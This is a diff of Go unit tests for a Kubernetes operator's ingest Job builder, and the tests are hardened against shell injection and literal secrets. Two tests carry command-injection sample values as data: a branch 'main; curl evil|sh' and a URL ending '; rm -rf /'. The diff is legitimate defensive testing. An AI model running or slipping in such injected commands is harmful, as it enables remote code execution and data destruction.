@@ -36,7 +36,7 @@ func testConfig() Config {
 		IngesterImage:    "registry.example/ingester:1.2.3",
 		OIDCIssuer:       "https://kc.example/realms/tatara",
 		OIDCClientID:     "tatara-operator",
-		OIDCClientSecret: "s3cr3t",
+		OIDCSecretName:   "tatara-operator",
 		OIDCAudience:     "tatara-memory",
 		Namespace:        "tatara",
 		ImagePullSecret:  "regcred",
@@ -109,11 +109,19 @@ func TestBuildJob_FullIngest(t *testing.T) {
 	}
 	clone := initCs[0]
 	cloneCmd := strings.Join(clone.Command, " ") + " " + strings.Join(clone.Args, " ")
-	if !strings.Contains(cloneCmd, "https://github.com/acme/widgets.git") {
-		t.Errorf("clone cmd missing url: %q", cloneCmd)
+	// URL and branch are passed via env vars, not interpolated into the shell
+	// command string, to prevent shell injection.
+	if !strings.Contains(cloneCmd, `"$GIT_CLONE_URL"`) {
+		t.Errorf("clone cmd must reference URL via env var $GIT_CLONE_URL: %q", cloneCmd)
 	}
-	if !strings.Contains(cloneCmd, "--branch main") {
-		t.Errorf("clone cmd missing branch: %q", cloneCmd)
+	if !strings.Contains(cloneCmd, `"$GIT_BRANCH"`) {
+		t.Errorf("clone cmd must reference branch via env var $GIT_BRANCH: %q", cloneCmd)
+	}
+	if v := envValue(clone, "GIT_CLONE_URL"); v != "https://github.com/acme/widgets.git" {
+		t.Errorf("GIT_CLONE_URL = %q, want https://github.com/acme/widgets.git", v)
+	}
+	if v := envValue(clone, "GIT_BRANCH"); v != "main" {
+		t.Errorf("GIT_BRANCH = %q, want main", v)
 	}
 
 	cs := job.Spec.Template.Spec.Containers
@@ -126,7 +134,8 @@ func TestBuildJob_FullIngest(t *testing.T) {
 	}
 
 	cmd := strings.Join(main.Command, " ") + " " + strings.Join(main.Args, " ")
-	if !strings.Contains(cmd, "tatara-ingest --repo-root /workspace/acme/widgets --repo-name widgets --base-url http://mem-acme.tatara.svc:8080") {
+	// repoDir is passed via GIT_REPO_DIR env var; command references it as "$GIT_REPO_DIR"
+	if !strings.Contains(cmd, `tatara-ingest --repo-root "$GIT_REPO_DIR" --repo-name widgets --base-url http://mem-acme.tatara.svc:8080`) {
 		t.Errorf("ingest cmd wrong: %q", cmd)
 	}
 	if strings.Contains(cmd, "--since") {
@@ -134,6 +143,9 @@ func TestBuildJob_FullIngest(t *testing.T) {
 	}
 	if !strings.Contains(cmd, "widgets-ingest-result") {
 		t.Errorf("ingest cmd must write result configmap: %q", cmd)
+	}
+	if v := envValue(main, "GIT_REPO_DIR"); v != "/workspace/acme/widgets" {
+		t.Errorf("GIT_REPO_DIR = %q, want /workspace/acme/widgets", v)
 	}
 
 	if v := envValue(main, "BASE_URL"); v != "http://mem-acme.tatara.svc:8080" {
@@ -145,8 +157,16 @@ func TestBuildJob_FullIngest(t *testing.T) {
 	if v := envValue(main, "OIDC_CLIENT_ID"); v != "tatara-operator" {
 		t.Errorf("OIDC_CLIENT_ID = %q", v)
 	}
-	if v := envValue(main, "OIDC_CLIENT_SECRET"); v != "s3cr3t" {
-		t.Errorf("OIDC_CLIENT_SECRET = %q", v)
+	// OIDC_CLIENT_SECRET must be sourced from a SecretKeyRef, never a literal Value.
+	if ref := envSecretRef(main, "OIDC_CLIENT_SECRET"); ref == nil {
+		t.Error("OIDC_CLIENT_SECRET must use SecretKeyRef, not a literal Value")
+	} else {
+		if ref.Name != "tatara-operator" {
+			t.Errorf("OIDC_CLIENT_SECRET secretKeyRef.name = %q, want tatara-operator", ref.Name)
+		}
+		if ref.Key != "OPERATOR_OIDC_CLIENT_SECRET" {
+			t.Errorf("OIDC_CLIENT_SECRET secretKeyRef.key = %q, want OPERATOR_OIDC_CLIENT_SECRET", ref.Key)
+		}
 	}
 	if v := envValue(main, "OIDC_AUDIENCE"); v != "tatara-memory" {
 		t.Errorf("OIDC_AUDIENCE = %q", v)
@@ -230,8 +250,12 @@ func TestBuildJob_FullHistoryClone(t *testing.T) {
 	if strings.Contains(cloneCmd, "--depth") {
 		t.Errorf("clone must be full history (no --depth): %q", cloneCmd)
 	}
-	if !strings.Contains(cloneCmd, "--branch main") {
-		t.Errorf("clone cmd missing branch: %q", cloneCmd)
+	// branch is passed as env var; shell command references it as "$GIT_BRANCH"
+	if !strings.Contains(cloneCmd, `--branch "$GIT_BRANCH"`) {
+		t.Errorf("clone cmd must reference branch via env var: %q", cloneCmd)
+	}
+	if v := envValue(clone, "GIT_BRANCH"); v != "main" {
+		t.Errorf("GIT_BRANCH = %q, want main", v)
 	}
 }
 
@@ -277,9 +301,11 @@ func TestBuildJob_SemanticModelEnv(t *testing.T) {
 	}
 }
 
+func boolPtrJ(v bool) *bool { return &v }
+
 func TestBuildJob_SemanticIngestEnv_True(t *testing.T) {
 	repo := testRepository()
-	repo.Spec.SemanticIngest = true
+	repo.Spec.SemanticIngest = boolPtrJ(true)
 	job := BuildJob(testProject(), repo, "", testBaseURL, testConfig())
 	main := job.Spec.Template.Spec.Containers[0]
 	if v := envValue(main, "SEMANTIC_INGEST"); v != "true" {
@@ -289,11 +315,25 @@ func TestBuildJob_SemanticIngestEnv_True(t *testing.T) {
 
 func TestBuildJob_SemanticIngestEnv_False(t *testing.T) {
 	repo := testRepository()
-	repo.Spec.SemanticIngest = false
+	repo.Spec.SemanticIngest = boolPtrJ(false)
 	job := BuildJob(testProject(), repo, "", testBaseURL, testConfig())
 	main := job.Spec.Template.Spec.Containers[0]
 	if v := envValue(main, "SEMANTIC_INGEST"); v != "false" {
 		t.Errorf("SEMANTIC_INGEST = %q, want false", v)
+	}
+}
+
+// TestBuildJob_SemanticIngestEnv_NilDefaultsTrue verifies that a nil
+// SemanticIngest pointer (field absent from YAML, default not yet applied by
+// apiserver) is treated as true so ingest behaviour is unchanged for existing
+// repos created before the *bool migration.
+func TestBuildJob_SemanticIngestEnv_NilDefaultsTrue(t *testing.T) {
+	repo := testRepository()
+	repo.Spec.SemanticIngest = nil
+	job := BuildJob(testProject(), repo, "", testBaseURL, testConfig())
+	main := job.Spec.Template.Spec.Containers[0]
+	if v := envValue(main, "SEMANTIC_INGEST"); v != "true" {
+		t.Errorf("nil SemanticIngest should default to true, got SEMANTIC_INGEST=%q", v)
 	}
 }
 
@@ -303,18 +343,108 @@ func TestBuildJob_NamespaceCloneDir(t *testing.T) {
 	// widgets repo URL is https://github.com/acme/widgets.git -> acme/widgets
 	const wantDir = "/workspace/acme/widgets"
 
+	// repoDir is passed as GIT_REPO_DIR env var; commands reference it as "$GIT_REPO_DIR"
 	clone := job.Spec.Template.Spec.InitContainers[0]
+	if v := envValue(clone, "GIT_REPO_DIR"); v != wantDir {
+		t.Errorf("clone GIT_REPO_DIR = %q, want %q", v, wantDir)
+	}
 	cloneCmd := strings.Join(clone.Command, " ") + " " + strings.Join(clone.Args, " ")
-	if !strings.Contains(cloneCmd, wantDir) {
-		t.Errorf("clone must target namespace dir %q: %q", wantDir, cloneCmd)
+	if !strings.Contains(cloneCmd, `"$GIT_REPO_DIR"`) {
+		t.Errorf("clone must reference dir via $GIT_REPO_DIR: %q", cloneCmd)
 	}
 
 	main := job.Spec.Template.Spec.Containers[0]
-	cmd := strings.Join(main.Command, " ") + " " + strings.Join(main.Args, " ")
-	if !strings.Contains(cmd, "--repo-root "+wantDir) {
-		t.Errorf("ingest cmd must use namespace repo-root %q: %q", wantDir, cmd)
+	if v := envValue(main, "GIT_REPO_DIR"); v != wantDir {
+		t.Errorf("ingest GIT_REPO_DIR = %q, want %q", v, wantDir)
 	}
-	if !strings.Contains(cmd, "git -C "+wantDir+" rev-parse HEAD") {
-		t.Errorf("HEAD resolution must run in namespace dir %q: %q", wantDir, cmd)
+	cmd := strings.Join(main.Command, " ") + " " + strings.Join(main.Args, " ")
+	if !strings.Contains(cmd, `--repo-root "$GIT_REPO_DIR"`) {
+		t.Errorf("ingest cmd must use $GIT_REPO_DIR for repo-root: %q", cmd)
+	}
+	if !strings.Contains(cmd, `git -C "$GIT_REPO_DIR" rev-parse HEAD`) {
+		t.Errorf("HEAD resolution must run via $GIT_REPO_DIR: %q", cmd)
+	}
+}
+
+// TestBuildJob_ShellInjectionBranchNotInCmd verifies that a branch containing
+// shell metacharacters is NOT interpolated into the clone command string.
+// The value must appear only in the GIT_BRANCH env var; the command must
+// reference it as "$GIT_BRANCH" so the shell never parses it as code.
+func TestBuildJob_ShellInjectionBranchNotInCmd(t *testing.T) {
+	repo := testRepository()
+	repo.Spec.DefaultBranch = "main; curl evil|sh"
+	job := BuildJob(testProject(), repo, "", testBaseURL, testConfig())
+	clone := job.Spec.Template.Spec.InitContainers[0]
+	cloneCmd := strings.Join(clone.Command, " ") + " " + strings.Join(clone.Args, " ")
+	if strings.Contains(cloneCmd, "curl evil") {
+		t.Errorf("shell-injection payload must not appear in clone command: %q", cloneCmd)
+	}
+	if v := envValue(clone, "GIT_BRANCH"); v != "main; curl evil|sh" {
+		t.Errorf("GIT_BRANCH env var must carry the raw branch value, got %q", v)
+	}
+}
+
+// TestBuildJob_ShellInjectionURLNotInCmd verifies that a URL containing
+// shell metacharacters is NOT interpolated into the clone command string.
+func TestBuildJob_ShellInjectionURLNotInCmd(t *testing.T) {
+	repo := testRepository()
+	repo.Spec.URL = "https://github.com/acme/widgets.git; rm -rf /"
+	job := BuildJob(testProject(), repo, "", testBaseURL, testConfig())
+	clone := job.Spec.Template.Spec.InitContainers[0]
+	cloneCmd := strings.Join(clone.Command, " ") + " " + strings.Join(clone.Args, " ")
+	if strings.Contains(cloneCmd, "rm -rf") {
+		t.Errorf("shell-injection payload must not appear in clone command: %q", cloneCmd)
+	}
+	if v := envValue(clone, "GIT_CLONE_URL"); v != "https://github.com/acme/widgets.git; rm -rf /" {
+		t.Errorf("GIT_CLONE_URL env var must carry the raw URL value, got %q", v)
+	}
+}
+
+// TestBuildJob_OIDCSecretViaSecretKeyRef verifies that OIDC_CLIENT_SECRET is
+// sourced from a SecretKeyRef and not embedded as a literal Value in the Job
+// spec (which would expose it in etcd and kubectl get job -o yaml output).
+func TestBuildJob_OIDCSecretViaSecretKeyRef(t *testing.T) {
+	job := BuildJob(testProject(), testRepository(), "", testBaseURL, testConfig())
+	main := job.Spec.Template.Spec.Containers[0]
+	for _, e := range main.Env {
+		if e.Name == "OIDC_CLIENT_SECRET" && e.Value != "" {
+			t.Errorf("OIDC_CLIENT_SECRET must not be a literal Value; got %q", e.Value)
+		}
+	}
+	ref := envSecretRef(main, "OIDC_CLIENT_SECRET")
+	if ref == nil {
+		t.Fatal("OIDC_CLIENT_SECRET must be sourced from a SecretKeyRef")
+	}
+	if ref.Name != "tatara-operator" || ref.Key != "OPERATOR_OIDC_CLIENT_SECRET" {
+		t.Errorf("OIDC_CLIENT_SECRET secretKeyRef = %s/%s, want tatara-operator/OPERATOR_OIDC_CLIENT_SECRET",
+			ref.Name, ref.Key)
+	}
+}
+
+// TestBuildJob_DegenerateURLFallsBackToRepoName verifies that a URL with no
+// meaningful path (e.g. bare host, no owner/repo) does not produce a clone
+// directory of /workspace or /workspace/<host> that would collide between
+// different repositories. The Job must fall back to the Repository name.
+func TestBuildJob_DegenerateURLFallsBackToRepoName(t *testing.T) {
+	tests := []struct {
+		name string
+		url  string
+	}{
+		{"bare host https", "https://github.com"},
+		{"bare host with slash", "https://github.com/"},
+		{"empty", ""},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			repo := testRepository()
+			repo.Spec.URL = tt.url
+			job := BuildJob(testProject(), repo, "", testBaseURL, testConfig())
+			clone := job.Spec.Template.Spec.InitContainers[0]
+			// repoDir is passed via GIT_REPO_DIR; must fall back to /workspace/<repo.Name>
+			wantDir := "/workspace/" + repo.Name
+			if v := envValue(clone, "GIT_REPO_DIR"); v != wantDir {
+				t.Errorf("degenerate URL %q: GIT_REPO_DIR = %q, want %q", tt.url, v, wantDir)
+			}
+		})
 	}
 }
